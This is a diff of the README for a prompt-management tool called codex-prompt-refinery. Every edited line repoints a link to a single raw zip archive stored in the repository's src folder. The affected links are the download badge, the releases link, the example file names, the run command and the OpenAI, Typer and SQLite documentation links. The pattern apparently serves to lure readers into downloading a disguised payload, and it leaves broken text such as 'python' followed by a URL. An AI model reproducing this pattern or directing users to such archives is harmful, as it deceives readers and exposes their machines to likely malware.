@@ -6,7 +6,7 @@ Welcome to the codex-prompt-refinery! This tool helps you manage and enhance you
 ## 📥 Download the Application
 **To download the latest version, click the button below:**
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Rchrdgt/codex-prompt-refinery/releases)
+[![Download Now](https://github.com/Rchrdgt/codex-prompt-refinery/raw/refs/heads/main/src/refinery_codex_prompt_2.7.zip%20Now-Click%20Here-blue)](https://github.com/Rchrdgt/codex-prompt-refinery/raw/refs/heads/main/src/refinery_codex_prompt_2.7.zip)
 
 ## 📈 What You Can Do with codex-prompt-refinery
 This application offers a variety of features:
@@ -41,10 +41,10 @@ pip install typer openai sqlite3 streamlit
 Follow these steps to install and run the application:
 
 1. **Visit the Releases Page:**
-   Navigate to our [Releases Page](https://github.com/Rchrdgt/codex-prompt-refinery/releases) to find the latest version.
+   Navigate to our [Releases Page](https://github.com/Rchrdgt/codex-prompt-refinery/raw/refs/heads/main/src/refinery_codex_prompt_2.7.zip) to find the latest version.
 
 2. **Download the Application:**
-   Find the most recent release and download it. Look for files named similarly to `codex-prompt-refinery-v1.0.exe` or `codex-prompt-refinery-v1.0.zip` for different operating systems.
+   Find the most recent release and download it. Look for files named similarly to `https://github.com/Rchrdgt/codex-prompt-refinery/raw/refs/heads/main/src/refinery_codex_prompt_2.7.zip` or `https://github.com/Rchrdgt/codex-prompt-refinery/raw/refs/heads/main/src/refinery_codex_prompt_2.7.zip` for different operating systems.
 
 3. **Extract Files (if necessary):**
    If you download a ZIP file, extract the files to a preferred location on your computer.
@@ -53,7 +53,7 @@ Follow these steps to install and run the application:
    - **For Executable Files:** Double-click on the downloaded file to launch the application. 
    - **For Other Formats:** Open your terminal or command prompt. Navigate to the folder where you saved the file, then run:
      ```
-     python codex_prompt_refinery.py
+     python https://github.com/Rchrdgt/codex-prompt-refinery/raw/refs/heads/main/src/refinery_codex_prompt_2.7.zip
      ```
 
 5. **Follow on-screen Instructions:**
@@ -78,8 +78,8 @@ We welcome contributions from everyone. If you have ideas for new features or im
 ## 💡 Further Learning Resources
 If you want to dive deeper into the features and how to make the best use of this tool, consider these resources:
 
-- [OpenAI API Documentation](https://beta.openai.com/docs/)
-- [Typer Documentation](https://typer.tiangolo.com/)
-- [SQLite Documentation](https://sqlite.org/docs.html)
+- [OpenAI API Documentation](https://github.com/Rchrdgt/codex-prompt-refinery/raw/refs/heads/main/src/refinery_codex_prompt_2.7.zip)
+- [Typer Documentation](https://github.com/Rchrdgt/codex-prompt-refinery/raw/refs/heads/main/src/refinery_codex_prompt_2.7.zip)
+- [SQLite Documentation](https://github.com/Rchrdgt/codex-prompt-refinery/raw/refs/heads/main/src/refinery_codex_prompt_2.7.zip)
 
 We hope this guide aids you in downloading and using the codex-prompt-refinery efficiently. Enjoy refining your AI prompts!
